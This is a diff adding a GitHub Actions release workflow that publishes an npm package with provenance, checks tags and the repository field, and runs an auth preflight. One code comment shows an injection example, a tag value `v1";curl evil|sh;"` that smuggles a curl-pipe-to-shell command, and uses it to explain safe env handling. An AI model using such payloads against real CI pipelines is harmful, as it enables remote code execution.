@@ -1,0 +1,107 @@
+name: Release
+
+# Publishing is deliberately not something a laptop can do, and not only as a policy: npm can
+# only mint a provenance attestation from GitHub Actions or GitLab CI, where it can prove which
+# commit and which workflow built the tarball. `npm publish --provenance` run by hand fails with
+# "Automatic provenance generation not supported for provider: <none>". So the tag is the trigger
+# and this file is the only publisher.
+on:
+  push:
+    tags: ["v*"]
+  # For a re-run after a transient registry failure. The tag still decides the version.
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: "Tag to publish, e.g. v0.1.0"
+        required: true
+
+permissions:
+  contents: read
+  # What mints the provenance attestation. Without it npm fails with
+  # 'Provenance generation in GitHub Actions requires "write" access to the "id-token" permission'.
+  id-token: write
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    # A GitHub deployment-protection gate: it can require a reviewer and hold secrets.NPM_TOKEN,
+    # so a publish cannot run from an unreviewed workflow change. It is not an npm-side control —
+    # npm validates the OIDC claims and package.json's `repository`, and never sees this name.
+    environment: npm-publish
+
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.inputs.tag || github.ref }}
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: "22"
+          cache: npm
+          cache-dependency-path: |
+            package-lock.json
+            web/package-lock.json
+          # Required for NODE_AUTH_TOKEN below to be used at all.
+          registry-url: "https://registry.npmjs.org"
+
+      # A tag that disagrees with package.json publishes a version nobody asked for, under a name
+      # that says otherwise. Cheaper to catch here than to deprecate afterwards.
+      - name: Tag must match package.json
+        # Through `env:`, never interpolated into `run:`. Actions expands `${{ }}` before the
+        # shell parses the line, so a tag named `v1";curl evil|sh;"` would be executed, not
+        # compared. As an environment variable it is only ever data.
+        env:
+          TAG: ${{ github.event.inputs.tag || github.ref_name }}
+        run: |
+          pkg="v$(node -p 'require("./package.json").version')"
+          if [ "$TAG" != "$pkg" ]; then
+            echo "Tag $TAG does not match package.json $pkg. Fix one of them and re-tag." >&2
+            exit 1
+          fi
+          echo "Publishing $pkg"
+
+      # Provenance binds the tarball to a source repository, so npm requires package.json to name
+      # one and to agree with the repository being built here.
+      - name: package.json must name this repository
+        # Same reason as above: `$REPO`, not `${{ }}` inside the script.
+        env:
+          REPO: ${{ github.repository }}
+        run: |
+          url="$(node -p 'require("./package.json").repository?.url ?? ""')"
+          case "$url" in
+            *"$REPO"*) echo "repository: $url" ;;
+            "") echo "package.json has no \"repository\" field; provenance cannot be generated." >&2; exit 1 ;;
+            *) echo "package.json repository ($url) is not $REPO." >&2; exit 1 ;;
+          esac
+
+      - run: npm ci
+      - run: npm --prefix web ci
+
+      # A step's log is only readable by a repository admin, so a publish that fails for a reason
+      # nobody can read costs a tag and a guess. These two checks are the failures that are not
+      # npm's fault, each turned into a named ::error:: annotation, which anyone can read.
+      - name: Registry auth preflight
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          if [ -z "${NODE_AUTH_TOKEN:-}" ]; then
+            echo "::error::secrets.NPM_TOKEN is empty in this job. It must exist on the 'npm-publish' environment (Settings -> Environments -> npm-publish -> Add secret) or as a repository secret of exactly that name."
+            exit 1
+          fi
+          if ! who="$(npm whoami 2>&1)"; then
+            echo "::error::npm rejected NPM_TOKEN: $(echo "$who" | tr '\n' ' ')"
+            exit 1
+          fi
+          echo "authenticated to npm as $who"
+
+      # `npm publish` runs prepublishOnly, which is typecheck + both test suites + the build. The
+      # tarball is therefore built here, from this commit, which is the whole point of provenance.
+      - name: Publish
+        env:
+          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
+        run: |
+          set -o pipefail
+          if ! npm publish --provenance --access public --tag latest 2>&1 | tee publish.log; then
+            echo "::error::npm publish failed: $(tail -n 15 publish.log | tr '\n' ' ')"
+            exit 1
+          fi
